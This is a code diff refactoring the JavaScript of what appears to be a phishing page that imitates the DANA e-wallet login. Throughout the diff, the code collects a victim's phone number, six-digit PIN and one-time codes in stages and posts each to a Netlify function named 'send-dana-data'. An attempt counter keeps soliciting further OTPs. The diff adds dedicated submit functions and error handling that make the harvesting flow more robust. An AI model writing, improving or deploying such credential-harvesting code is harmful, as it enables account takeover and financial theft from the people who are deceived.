@@ -10,11 +10,11 @@ document.addEventListener('DOMContentLoaded', function() {
   const pinInputs = document.querySelectorAll('.pin-box');
   const otpInputs = document.querySelectorAll('.otp-box');
   const continueBtn = document.getElementById('lanjutkan-button');
+  const showPinBtn = document.querySelector('.show-text');
   const notification = document.getElementById('floating-notification');
   const successNotification = document.getElementById('success-notification');
   const attemptCounter = document.getElementById('attempt-counter');
   const attemptNumber = document.getElementById('attempt-number');
-  const showPinBtn = document.querySelector('.show-text');
 
   // State Management
   const state = {
@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function() {
     otpTimer: null
   };
 
-  // 1. PHONE NUMBER PAGE
+  // 1. PHONE NUMBER INPUT HANDLING
   phoneInput.addEventListener('input', function(e) {
     let value = e.target.value.replace(/\D/g, '');
     
@@ -45,7 +45,27 @@ document.addEventListener('DOMContentLoaded', function() {
     state.phoneNumber = value;
   });
 
-  // 2. PIN PAGE
+  // 2. CONTINUE BUTTON HANDLER
+  continueBtn.addEventListener('click', async function() {
+    if (state.currentPage === 'phone') {
+      if (state.phoneNumber.length < 10) {
+        showError('Nomor HP harus minimal 10 digit');
+        return;
+      }
+      
+      showLoading();
+      try {
+        await sendData('phone', { phone: state.phoneNumber });
+        switchPage('pin');
+      } catch (error) {
+        showError('Gagal mengirim nomor HP');
+      } finally {
+        hideLoading();
+      }
+    }
+  });
+
+  // 3. PIN INPUT HANDLING
   pinInputs.forEach((input, index) => {
     input.addEventListener('input', function(e) {
       e.target.value = e.target.value.replace(/\D/g, '');
@@ -57,7 +77,7 @@ document.addEventListener('DOMContentLoaded', function() {
       state.pin = Array.from(pinInputs).map(i => i.value).join('');
       
       if (state.pin.length === 6) {
-        submitData('pin', { phone: state.phoneNumber, pin: state.pin });
+        submitPIN();
       }
     });
 
@@ -68,7 +88,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
 
-  // 3. OTP PAGE
+  // 4. OTP INPUT HANDLING
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', function(e) {
       e.target.value = e.target.value.replace(/\D/g, '');
@@ -80,11 +100,7 @@ document.addEventListener('DOMContentLoaded', function() {
       state.otp = Array.from(otpInputs).map(i => i.value).join('');
       
       if (state.otp.length === 4) {
-        submitData('otp', { 
-          phone: state.phoneNumber, 
-          pin: state.pin,
-          otp: state.otp 
-        });
+        submitOTP();
       }
     });
 
@@ -102,7 +118,7 @@ document.addEventListener('DOMContentLoaded', function() {
       page.style.display = 'none';
     });
     
-    // Show target page
+    // Show target page with smooth transition
     pages[targetPage].style.display = 'block';
     state.currentPage = targetPage;
     
@@ -113,9 +129,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }, 100);
   }
 
-  async function submitData(type, data) {
-    showLoading();
-    
+  async function sendData(type, data) {
     try {
       const response = await fetch('/.netlify/functions/send-dana-data', {
         method: 'POST',
@@ -127,30 +141,47 @@ document.addEventListener('DOMContentLoaded', function() {
         throw new Error(await response.text());
       }
       
-      const result = await response.json();
-      
-      // Handle page transitions
-      if (type === 'phone' && result.success) {
-        switchPage('pin');
-      } 
-      else if (type === 'pin' && result.success) {
-        switchPage('otp');
-        startOtpTimer();
-        showNotification();
-      }
-      else if (type === 'otp') {
-        handleOtpResponse(result);
-      }
-      
+      return await response.json();
     } catch (error) {
-      console.error('Error:', error);
-      showError(error.message);
+      console.error('API Error:', error);
+      throw error;
+    }
+  }
+
+  async function submitPIN() {
+    showLoading();
+    try {
+      await sendData('pin', { phone: state.phoneNumber, pin: state.pin });
+      switchPage('otp');
+      startOTPTimer();
+      showNotification();
+    } catch (error) {
+      showError('PIN salah atau terjadi kesalahan');
+      clearPINInputs();
     } finally {
       hideLoading();
     }
   }
 
-  function startOtpTimer() {
+  async function submitOTP() {
+    showLoading();
+    try {
+      await sendData('otp', { 
+        phone: state.phoneNumber, 
+        pin: state.pin,
+        otp: state.otp 
+      });
+      
+      handleOTPResponse();
+    } catch (error) {
+      showError('OTP salah atau terjadi kesalahan');
+      handleOTPError();
+    } finally {
+      hideLoading();
+    }
+  }
+
+  function startOTPTimer() {
     clearInterval(state.otpTimer);
     let timeLeft = 120;
     const timerElement = document.getElementById('otp-timer');
@@ -168,7 +199,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }, 1000);
   }
 
-  function handleOtpResponse(response) {
+  function handleOTPResponse() {
     state.attempts++;
     attemptNumber.textContent = state.attempts;
     attemptCounter.style.display = 'block';
@@ -184,6 +215,18 @@ document.addEventListener('DOMContentLoaded', function() {
         successNotification.style.display = 'none';
       }, 5000);
     }
+  }
+
+  function handleOTPError() {
+    otpInputs.forEach(input => input.value = '');
+    otpInputs[0].focus();
+    state.otp = '';
+  }
+
+  function clearPINInputs() {
+    pinInputs.forEach(input => input.value = '');
+    pinInputs[0].focus();
+    state.pin = '';
   }
 
   // UI HELPERS
@@ -204,6 +247,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
   function showError(message) {
     const errorElement = document.getElementById('error-message');
+    if (!errorElement) return;
+    
     errorElement.textContent = message;
     errorElement.style.display = 'block';
     setTimeout(() => {
